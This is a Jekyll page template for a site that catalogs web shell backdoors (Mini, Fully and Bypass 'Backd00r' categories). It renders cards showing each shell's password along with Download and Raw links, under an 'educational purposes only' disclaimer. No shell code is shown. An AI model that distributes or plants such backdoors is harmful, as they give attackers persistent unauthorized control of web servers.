---
layout: default
title: WebShell
---

<style>

.text { 
  color: #FF5151;
  text-decoration: none;
  display: inline;
  background-image: linear-gradient(to bottom, transparent 20%, currentColor 17%);
  background-position: 0 100%;
  transition: background-size 0.5s ease-in-out 0.2s;
  background-repeat: no-repeat;
  background-size: 0% 4px;
}

  .text:hover,
  .text:focus {
    color: #FF5151;
    text-decoration: none;
    background-size: 100% 4px;
    transition-delay: 0s;
  }

</style>
<!-- # [WebShell](https://adilhyz.github.io/WebShell) -->

<a id="top"></a>

![hudaw](https://adilhyz.github.io/WebShell/screenshot.png)

Shell Backdoor, could be useful for the needs of

<span> Disclaimer </span>
 
<p class="text">This is just collection for educational purposes only. Use it responsibly and only on systems for which you have explicit permission. Unauthorized use of this tool is illegal and unethical, Author not responsible if there is any mess.</p>

Author: [Adilhyz](https://adilhyz.github.io)


## **Category ⛱**

[ `Safety Backd00r` ](#safety-backd00r)&ensp;
[ `File Manager` ](#file-manager)&ensp;
[ `Mini Backd00r` ](#mini-backd00r)&ensp;
[ `Fully Backd00r` ](#fully-backd00r)&ensp;
[ `Bypass Backd00r` ](#bypass-backd00r)&ensp;

<a href="#top" id="toTopBtn" class="toptop">↑</a>


{% assign grouped = site.data.shells | group_by: "category" %}
{% for cat in grouped %}
  <h2 class="name" id="{{ cat.name | slugify }}">{{ cat.name }}</h2>
  <div class="shell-container">
    {% for shell in cat.items %}
      <div class="shell-card">
        <h2 class="name">{{ shell.name }}</h2>
        <a href="{{ shell.image }}"><img src="{{ shell.image }}" alt="{{ shell.name }}"></a>
        <div class="info">
          <p class="size">Size: {{ shell.size }}</p>
          <p>Version: {{ shell.version }}</p>
          {% if shell.name == "Alfa Shell" %}
            <p>User/Password: {{ shell.password }}</p>
          {% elsif shell.name == "Ipt Mini Shell" %}
            <p>User/Password: {{ shell.password }}</p>
          {% else %}
            <p>Password: {{ shell.password }}</p>
          {% endif %}
        </div>
        <a href="{{ shell.download }}">Download</a>
        <a href="{{ shell.raw }}">Raw &gt;</a>
      </div>
    {% endfor %}
  </div>
{% endfor %}